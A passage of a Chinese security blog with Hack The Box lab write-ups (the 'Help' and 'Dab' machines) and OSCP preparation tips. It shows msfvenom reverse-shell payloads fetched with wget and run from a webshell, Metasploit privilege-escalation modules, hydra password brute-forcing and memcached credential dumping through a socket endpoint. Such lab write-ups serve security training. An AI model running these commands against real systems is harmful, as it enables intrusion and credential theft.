class="hljs-number">3000</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt<br>结果，没有发现任何存在目录<br></code></pre></div></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-25-02/3.PNG" alt="3"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cmd=uname+-a<br>Linux help <span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">116</span>-generic <span class="hljs-comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-number">64</span>位linux，ubuntu<br><br>pwd<br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>support<span class="hljs-regexp">/uploads/</span>tickets<br><br>cmd=cat+<span class="hljs-regexp">/home/</span>help/user.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-25-02/4.PNG" alt="4"></p><p>获得help用户的webshell，如果不会这一步，参考<a href="https://whale3070.github.io/tag/#/command%20execution">https://whale3070.github.io/tag/#/command%20execution</a></p><hr><p>查看内核版本后，searchsploit linux 4.4.0，根据结果，值得尝试msf suggester。</p><p>生成64位msf回连载荷，上传</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp LHOST=<span class="hljs-number">10.10.14.2</span> LPORT=<span class="hljs-number">6678</span> -f elf -o payload.elf<br><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">8001</span><br></code></pre></div></td></tr></table></figure><p>攻击机webshell:</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.2</span>:<span class="hljs-number">8001</span><span class="hljs-regexp">/payload.elf -P /</span>tmp<br>chmod +x <span class="hljs-regexp">/tmp/</span>payload.elf<br></code></pre></div></td></tr></table></figure><p>本地监听：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">handler</span> -H <span class="hljs-number">10.10.14.2</span> -P <span class="hljs-number">6678</span> -p linux/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp<br></code></pre></div></td></tr></table></figure><p>攻击机webshell:    <code>./payload.elf</code></p><p>本地监听，成功回连msf payload:</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">use post/multi/recon/local_exploit_suggester<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">2</span><br><br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.121</span> - exploit/linux/<span class="hljs-keyword">local</span>/bpf_priv_esc: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.121</span> - exploit/linux/<span class="hljs-keyword">local</span>/bpf_sign_extension_priv_esc: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.121</span> - exploit/linux/<span class="hljs-keyword">local</span>/glibc_realpath_priv_esc: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br><br><br>use exploit/linux/<span class="hljs-keyword">local</span>/bpf_priv_esc<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">set</span> LHOST <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span><br><span class="hljs-keyword">set</span> LPORT <span class="hljs-number">6679</span><br><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br>run<br>失败<br><br><span class="hljs-comment">---</span><br>use exploit/linux/<span class="hljs-keyword">local</span>/bpf_sign_extension_priv_esc<br><span class="hljs-keyword">set</span> payload linux/x64/meterpreter_reverse_tcp<br><span class="hljs-keyword">set</span> LHOST <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span><br><span class="hljs-keyword">set</span> LPORT <span class="hljs-number">6679</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br>run<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-25-02/7.PNG" alt="7"></p>]]></content>
    
    
    <categories>
      
      <category>vuln service</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>五步完成oscp的准备</title>
    <link href="/2019/04/22/12-x/"/>
    <url>/2019/04/22/12-x/</url>
    
    <content type="html"><![CDATA[<h1 id="五步完成oscp的准备"><a href="#五步完成oscp的准备" class="headerlink" title="五步完成oscp的准备"></a>五步完成oscp的准备</h1><h2 id="一个三十天完成lab实验并通过oscp认证的黑客的自述"><a href="#一个三十天完成lab实验并通过oscp认证的黑客的自述" class="headerlink" title="一个三十天完成lab实验并通过oscp认证的黑客的自述"></a>一个三十天完成lab实验并通过oscp认证的黑客的自述</h2><p><a href="https://medium.com/bugbountywriteup/5-tips-for-oscp-prep-76001cdf4f4f">https://medium.com/bugbountywriteup/5-tips-for-oscp-prep-76001cdf4f4f</a></p><h2 id="我通过oscp考试的经验"><a href="#我通过oscp考试的经验" class="headerlink" title="我通过oscp考试的经验"></a>我通过oscp考试的经验</h2><p>我获得了实验室的访问资格，和一本380页的电子书，以及许多小时的视频。</p><p>在看材料的时候，我运行了密集的扫描。</p><p>看完材料后，我现在有了一个完全进行扫描了的列表。我花费了几个星期来分析，最后一周<br>我做了一份198页的报告——主要是因为大量高清的截图和代码片段。</p><p>我的计划是，在扫描4个主机的同时，开始利用缓冲区漏洞，然后在4个主机中，找到一个最简单的主机并提权。</p><p>我提权了一个最简单的主机，然后在9小时内获取了两个中等难度的主机的用户。<br>我遇到了困难，不能提权两个主机的任何一个，也不能获取通过考试的分数。</p><p>被初次尝试打击到了，但是庆幸于严格挑选主机，我选择了第二次尝试并且把希望放在的不同的medium主机上!</p><p>我第二次尝试很顺利，然后我提权了两个medium主机。在这些主机之后，我已经有了足够的分数<br>通过考试。我选择放弃难度大的主机，去完成39页的考试报告。我最终在20小时之内完成考试并提交了报告。</p><h2 id="1-htb-lab和IppSec-youtube视频"><a href="#1-htb-lab和IppSec-youtube视频" class="headerlink" title="1 htb lab和IppSec youtube视频"></a>1 htb lab和IppSec youtube视频</h2><p><a href="https://www.hackthebox.eu/">https://www.hackthebox.eu/</a></p><p><a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA</a></p><p>以及htb上，类似与oscp的主机名单。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-22-12/19.PNG" alt="19"></p><h2 id="2-Georgia-Weidman"><a href="#2-Georgia-Weidman" class="headerlink" title="2 Georgia Weidman"></a>2 Georgia Weidman</h2><p><a href="https://nostarch.com/pentesting">https://nostarch.com/pentesting</a></p><p><a href="https://www.cybrary.it/course/advanced-penetration-testing/">https://www.cybrary.it/course/advanced-penetration-testing/</a></p><p>Georgia Weidman的书，可以当作PWK课程教程的替代品。她提供了免费的课程，并且手把手在书中指导网络安全。当你还没准备好时，强烈推荐本书作为PWK课程提纲进行复习。</p><h2 id="3-dostackbufferoverflowgood"><a href="#3-dostackbufferoverflowgood" class="headerlink" title="3 dostackbufferoverflowgood"></a>3 dostackbufferoverflowgood</h2><p><a href="https://github.com/justinsteven/dostackbufferoverflowgood">https://github.com/justinsteven/dostackbufferoverflowgood</a></p><p>缓冲区溢出学习</p><h2 id="4-不同的社区"><a href="#4-不同的社区" class="headerlink" title="4 不同的社区"></a>4 不同的社区</h2><p><a href="https://discordapp.com/invite/TN3jXaQ">https://discordapp.com/invite/TN3jXaQ</a></p><p><a href="https://discord.gg/2G2nap8">https://discord.gg/2G2nap8</a></p><h2 id="5-onetwopunch"><a href="#5-onetwopunch" class="headerlink" title="5 onetwopunch"></a>5 onetwopunch</h2><p><a href="https://github.com/superkojiman/onetwopunch">https://github.com/superkojiman/onetwopunch</a><br>我将提供的一个小实用技巧是一个名为onetwopunch的便捷工具，它帮助在大型实验室网络中以极高的准确度完成了大量的普通扫描。</p><p>此工具使用unicornscan快速扫描主机上的每个TCP和UDP端口，然后将打开的端口传递给nmap，您可以使用该端口指定标志。 我用它来轻松准确地在实验室和考试网络上运行扫描。</p><p>参考资料：</p><ul><li><a href="https://xz.aliyun.com/t/1587/">https://xz.aliyun.com/t/1587/</a></li><li><a href="https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob">https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob</a></li><li><a href="http://f4l13n5n0w.github.io/blog/2015/05/05/jing-yan-fen-xiang-oscp-shen-tou-ce-shi-ren-zheng/">http://f4l13n5n0w.github.io/blog/2015/05/05/jing-yan-fen-xiang-oscp-shen-tou-ce-shi-ren-zheng/</a></li></ul><ul><li>  <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse shell cheat sheet</a></li><li>  <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></li><li>  <a href="http://netsec.ws/?p=331">Creating Metasploit Payloads</a></li><li>  <a href="https://sathisharthars.wordpress.com/2015/01/28/oscp-offensive-security-certified-professional-handy-tips-and-tricks/">OSCP Handy Tips and Tricks</a></li></ul><p>| <a href="http://www.greyhathacker.net/?p=738">Windows:Elevating privileges by exploiting weak folder permissions</a> |<br>| <a href="http://www.fuzzysecurity.com/tutorials/16.html">Windows: Privilege Escalation Fundamentals</a> |<br>| <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows: Windows-Exploit-Suggester</a> |<br>| <a href="http://pwnwiki.io/#!privesc/windows/index.md">Windows: Privilege Escalation Commands</a> |<br>| <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Linux: Basic Linux Privilege Escalation</a> |<br>| <a href="http://www.securitysift.com/download/linuxprivchecker.py">Linux: linuxprivchecker.py</a> |<br>| <a href="https://github.com/rebootuser/LinEnum">Linux: LinEnum</a> |<br>| <a href="https://www.youtube.com/watch?v=PC_iMqiuIRQ">Practical Windows Privilege Escalation</a> |<br>| <a href="https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/">MySQL Root to System Root with UDF</a> |</p>]]></content>
    
    
    <categories>
      
      <category>experience</category>
      
    </categories>
    
    
    <tags>
      
      <tag>experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dab（path fuzz）</title>
    <link href="/2019/04/19/04-x/"/>
    <url>/2019/04/19/04-x/</url>
    
    <content type="html"><![CDATA[<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sV -p <span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.10.10.86</span><br><br><span class="hljs-attribute">Starting</span> Nmap <span class="hljs-number">7</span>.<span class="hljs-number">60</span> ( https://nmap.org ) at <span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-<span class="hljs-number">18</span> <span class="hljs-number">15</span>:<span class="hljs-number">10</span> +<span class="hljs-number">08</span><br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">10.10.10.86</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">29</span>s latency).<br><br><span class="hljs-attribute">PORT</span>   STATE SERVICE VERSION<br><span class="hljs-attribute">21</span>/tcp open  ftp     vsftpd <span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">2</span>p<span class="hljs-number">2</span> Ubuntu <span class="hljs-number">4</span>ubuntu<span class="hljs-number">2</span>.<span class="hljs-number">4</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp open  http    nginx <span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">3</span> (Ubuntu)<br><span class="hljs-attribute">8080</span>/tcp open  http    nginx <span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">3</span> (Ubuntu)<br><span class="hljs-attribute">Service</span> Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></div></td></tr></table></figure><hr><p>全端口检查</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">8080</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.86</span>                                   <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">21</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.86</span>                                     <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">80</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.86</span>                                     <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">22</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.86</span>    <br></code></pre></div></td></tr></table></figure><p>没发现其他开放端口</p><h1 id="port"><a href="#port" class="headerlink" title="port"></a>port</h1><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><p>用msf ssh用户枚举模块，检查存在的用户<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-19-04/4.PNG" alt="4"></p><h4 id="info1-user-txt"><a href="#info1-user-txt" class="headerlink" title="info1: user.txt"></a>info1: user.txt</h4><figure class="highlight haxe"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haxe">root<br>bin<br>daemon<br>lp<br>sync<br>mail<br><span class="hljs-keyword">new</span><span class="hljs-type">s</span><br>uucp<br>games<br>ftp<br>nobody<br>backup<br></code></pre></div></td></tr></table></figure><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p>ftp 10.10.10.86</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">trying1:检查弱密码<br>hydra -l root -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>long-pass-rockyou.txt ftp:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span><br><br>trying2:检查ftp服务版本漏洞<br>msfconsole<br>search type:auxiliary ftp<br><br>trying3:匿名用户登陆<br>ftp <span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span><br>anonymous<br><br>ftp获得了一个dab.jpg，貌似没什么用<br><br>hydra -l dab -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt ftp:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-19-04/3.PNG" alt="3"><br>ftp可读不可写。</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-19-04/2.PNG" alt="2"></p><p>根据数据包，可以用hydra爆破</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.10.10.86</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X<span class="hljs-number">11</span>; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>; rv:<span class="hljs-number">52</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">52</span>.<span class="hljs-number">0</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">10.10.10.86</span>/login</span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">38</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">000</span>&amp;password=<span class="hljs-number">999</span>&amp;submit=Login</span><br></code></pre></div></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">hydra -L <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>linux-user.txt -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span><span class="hljs-number">370</span>-pass.txt <span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span> http-post-form <span class="hljs-string">&quot;/login:username=^USER^&amp;password=^PASS^&amp;submit=Login:Error&quot;</span><br><br>hydra -l dab -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span><span class="hljs-number">500</span>-worst-passwords.txt <span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span> http-post-form <span class="hljs-string">&quot;/login:username=^USER^&amp;password=^PASS^&amp;submit=Login:Error&quot;</span><br><br>hydra -L rockyou.txt -P rockyou.txt <span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span> http-post-form <span class="hljs-string">&quot;/login:username=^USER^&amp;password=^PASS^&amp;submit=Login:Error&quot;</span><br><br>sqlmap -r post.txt --dbs --level <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>没有任何关于web口令的进展。</p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>gobuster扫描存在的目录有：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span>/login<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span>:<span class="hljs-number">8080</span>/socket<br></code></pre></div></td></tr></table></figure><h4 id="nginx-1-10-3漏洞"><a href="#nginx-1-10-3漏洞" class="headerlink" title="nginx 1.10.3漏洞"></a>nginx 1.10.3漏洞</h4><p><a href="http://www.91ri.org/9064.html">http://www.91ri.org/9064.html</a>  解析漏洞</p><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">http://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.86</span>:<span class="hljs-number">8080</span><br><span class="hljs-type">Internal</span> Dev<br><span class="hljs-keyword">Access</span> denied: <span class="hljs-keyword">password</span> authentication cookie <span class="hljs-keyword">not</span> <span class="hljs-keyword">set</span> <br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-19-04/14.PNG" alt="14"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"> dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/socket/</span><br>dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span>:<span class="hljs-number">8080</span>/socket?<br>可能是wfuzz出参数，然后命令执行<br></code></pre></div></td></tr></table></figure><h2 id="trying"><a href="#trying" class="headerlink" title="trying:"></a>trying:</h2><p>利用info1的字典，用hydra得到了可登录的账号。</p><p>hydra -L user.txt -P /usr/share/wordlists/500-worst-passwords.txt 10.10.10.86 ftp</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-19-04/5.PNG" alt="5"></p><h4 id="info2-ftp账号"><a href="#info2-ftp账号" class="headerlink" title="info2 : ftp账号"></a>info2 : ftp账号</h4><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.86</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-number">123456</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.86</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-number">12345678</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.86</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: pussy<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.86</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-number">12345</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.86</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-keyword">password</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.86</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-number">1234</span><br></code></pre></div></td></tr></table></figure><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>通过暴力破解，得到admin/Password1，作为密码，进入80端口。</p><p>参考<a href="https://whale3070.github.io/tools/2019/03/24/02-x/">这篇文章</a>，<code>Cookie: password=secret</code>，用插件<code>cookie editor</code>修改cookie.</p><p>通过验证进入页面后，发现一个tcp连接的php脚本</p><p><a href="http://10.10.10.86:8080/socket?port=22&amp;cmd=11">http://10.10.10.86:8080/socket?port=22&amp;cmd=11</a></p><p>通过fuzz，获取开放的端口。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wfuzz</span> -c --hc=<span class="hljs-number">500</span> -z range,<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -H <span class="hljs-string">&quot;Cookie: password=secret&quot;</span> &#x27;http://<span class="hljs-number">10.10.10.86:8080</span>/socket?port=FUZZ&amp;cmd=<span class="hljs-number">11</span>&#x27;<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-19-04/17.PNG" alt="17"></p><p>开放的端口除了已知的，还有11211，Memory cache service，内存缓存服务。</p><p>免费和开源，高性能，分布式<strong>内存对象缓存系统</strong>，本质上是通用的，但旨在通过减轻数据库负载来加速动态Web应用程序。</p><p>搜索“memcached cheat sheet(备忘单)”，得知服务的使用方式。</p><p><a href="https://lzone.de/cheat-sheet/memcached">https://lzone.de/cheat-sheet/memcached</a></p><hr><p><a href="http://10.10.10.86:8080/socket?port=11211&amp;cmd=stats+slabs">http://10.10.10.86:8080/socket?port=11211&amp;cmd=stats+slabs</a></p><p><a href="http://10.10.10.86:8080/socket?port=11211&amp;cmd=get+users">http://10.10.10.86:8080/socket?port=11211&amp;cmd=get+users</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-19-04/6.PNG" alt="6"></p><p>获得了一系列数据，将这些数据保存为json.</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">jq . <span class="hljs-keyword">test</span>.json | awk -F\&quot; &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$2&#125;</span>&#x27; &gt; /root/Desktop/10.10.10.86/user.lst<br>jq . <span class="hljs-keyword">test</span>.json | awk -F\&quot; &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$4&#125;</span>&#x27; &gt; 